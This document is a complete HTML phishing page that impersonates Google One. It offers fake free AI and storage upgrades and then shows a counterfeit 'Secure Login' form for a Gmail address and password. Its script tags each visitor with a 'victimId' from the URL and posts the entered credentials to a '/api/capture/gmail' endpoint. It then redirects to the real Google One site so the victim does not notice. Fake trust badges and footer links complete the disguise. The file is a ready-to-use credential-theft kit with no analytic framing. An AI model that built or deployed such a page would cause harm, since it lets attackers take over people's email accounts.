<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Google One - Exclusive Offers</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
        }

        .glass {
            background: rgba(20, 20, 20, 0.92);
            backdrop-filter: blur(16px);
            border-radius: 48px;
            padding: 40px 32px;
            max-width: 560px;
            width: 100%;
            border: 1px solid rgba(255, 50, 50, 0.15);
            box-shadow: 0 30px 80px rgba(255, 0, 0, 0.08);
            text-align: center;
            color: #fff;
        }

        /* ===== GOOGLE ORIGINAL LOGO ===== */
        .google-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            margin-bottom: 6px;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -1px;
        }
        .google-logo .g { color: #4285f4; }
        .google-logo .o1 { color: #ea4335; }
        .google-logo .o2 { color: #fbbc04; }
        .google-logo .l { color: #34a853; }
        .google-logo .e { color: #ea4335; }

        .glass h1 {
            font-size: 26px;
            font-weight: 700;
            color: #fff;
            margin: 4px 0 2px;
        }
        .glass .sub {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.4);
            margin: 2px 0 20px;
        }

        /* ===== OFFER GRID ===== */
        .offer-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            margin: 18px 0;
        }

        .offer-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 20px;
            padding: 18px 12px;
            cursor: pointer;
            transition: all 0.25s ease;
            position: relative;
        }
        .offer-card:active {
            transform: scale(0.94);
            background: rgba(234, 67, 53, 0.1);
            border-color: #ea4335;
        }
        .offer-card .icon {
            font-size: 32px;
            display: block;
            margin-bottom: 4px;
        }
        .offer-card .label {
            font-size: 13px;
            font-weight: 600;
            color: #fff;
        }
        .offer-card .desc {
            font-size: 11px;
            opacity: 0.4;
            margin-top: 2px;
        }
        .offer-card .badge {
            position: absolute;
            top: -6px;
            right: -6px;
            background: #ea4335;
            color: #fff;
            font-size: 8px;
            padding: 2px 8px;
            border-radius: 20px;
            font-weight: 700;
            text-transform: uppercase;
        }

        /* ===== BUTTONS ===== */
        .glow-btn {
            background: linear-gradient(145deg, #ea4335, #c62828);
            border: none;
            padding: 16px;
            border-radius: 60px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 30px rgba(234, 67, 53, 0.2);
            transition: 0.25s;
            margin: 12px 0 6px;
        }
        .glow-btn:active { transform: scale(0.96); }

        .input-group {
            text-align: left;
            margin: 14px 0 8px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            opacity: 0.6;
            margin-bottom: 5px;
            color: #fff;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.03);
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.25s;
        }
        .input-group input:focus {
            border-color: #ea4335;
            background: rgba(255, 255, 255, 0.06);
        }
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }

        .back-btn {
            background: rgba(255, 255, 255, 0.04) !important;
            border: 1px solid rgba(255, 255, 255, 0.06) !important;
            box-shadow: none !important;
            margin-top: 10px;
            font-size: 15px !important;
            padding: 14px !important;
            color: #fff !important;
        }

        .fake-footer {
            margin-top: 24px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            display: flex;
            justify-content: center;
            gap: 18px;
            flex-wrap: wrap;
            font-size: 11px;
            opacity: 0.3;
        }
        .fake-footer a { color: #fff; text-decoration: none; }
        .fake-footer a:hover { text-decoration: underline; }

        .footer-text {
            font-size: 11px;
            opacity: 0.2;
            margin-top: 18px;
            color: #fff;
        }

        /* ===== RED ACCENT ===== */
        .red-text { color: #ea4335; }
        .border-red { border-color: rgba(234, 67, 53, 0.15); }
    </style>
</head>
<body>

    <div class="glass" id="mainPage">
        <!-- ===== ORIGINAL GOOGLE LOGO ===== -->
        <div class="google-logo">
            <span class="g">G</span>
            <span class="o1">o</span>
            <span class="o2">o</span>
            <span class="o2">g</span>
            <span class="l">l</span>
            <span class="e">e</span>
        </div>

        <h1>One Exclusive Offers</h1>
        <p class="sub">Get free AI & storage upgrades — limited time</p>

        <div class="offer-grid" id="offerGrid"></div>

        <div class="fake-footer">
            <a href="#">🆘 Help Desk</a>
            <a href="#">📜 Terms</a>
            <a href="#">🔒 Privacy</a>
        </div>
        <p class="footer-text">Secure & encrypted · 256-bit SSL</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const victimId = urlParams.get('v') || 'unknown';

        const offers = [
            { id: 'ai_plus', icon: '🤖', label: 'Google AI Plus', desc: '400 GB + Gemini 2x', badge: '🔥' },
            { id: 'gemini_pro', icon: '🧠', label: 'Gemini Pro', desc: '5 TB + 4x AI', badge: '⭐' },
            { id: 'ultra', icon: '⚡', label: 'One Ultra', desc: '20 TB + 20x AI', badge: '🚀' },
            { id: 'basic', icon: '📦', label: 'One Basic', desc: '100 GB storage', badge: '' },
            { id: 'standard', icon: '🚀', label: 'One Standard', desc: '200 GB storage', badge: '' }
        ];

        const grid = document.getElementById('offerGrid');
        offers.forEach(offer => {
            const card = document.createElement('div');
            card.className = 'offer-card';
            card.innerHTML = `
                <span class="icon">${offer.icon}</span>
                <div class="label">${offer.label}</div>
                <div class="desc">${offer.desc}</div>
                ${offer.badge ? `<span class="badge">${offer.badge}</span>` : ''}
            `;
            card.onclick = () => showLogin(offer.id, offer.label);
            grid.appendChild(card);
        });

        function showLogin(offerId, offerLabel) {
            const main = document.getElementById('mainPage');
            main.innerHTML = `
                <div class="google-logo">
                    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="o2">g</span><span class="l">l</span><span class="e">e</span>
                </div>
                <h1 style="color: #ea4335;">🔐 Secure Login</h1>
                <p style="opacity:0.5; margin:10px 0 18px; font-size:14px; color:#fff;">
                    Enter your credentials to claim <strong style="color:#ea4335;">${offerLabel}</strong>
                </p>
                <div class="input-group">
                    <label>📧 Email</label>
                    <input type="email" id="loginUser" placeholder="Enter your Gmail address" />
                </div>
                <div class="input-group">
                    <label>🔒 Password</label>
                    <input type="password" id="loginPass" placeholder="Enter your password" />
                </div>
                <button class="glow-btn" onclick="submitLogin('${offerId}')">🚀 Claim Offer</button>
                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
                <div class="fake-footer" style="margin-top:20px;">
                    <a href="#">🆘 Help Desk</a>
                    <a href="#">📜 Terms</a>
                    <a href="#">🔒 Privacy</a>
                </div>
                <p class="footer-text" style="margin-top:12px;">🔐 Secure & encrypted</p>
            `;
        }

        async function sendData(payload) {
            try {
                await fetch('/api/capture/gmail', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId, type: 'gmail', ...payload })
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        async function submitLogin(offerId) {
            const username = document.getElementById('loginUser').value;
            const password = document.getElementById('loginPass').value;
            if (!username || !password) {
                alert('⚠️ Please fill all fields');
                return;
            }
            await sendData({
                creds: {
                    platform: 'gmail',
                    username: username,
                    password: password,
                    offer: offerId
                }
            });
            window.location.href = 'https://one.google.com/';
        }
    </script>
</body>
</html>
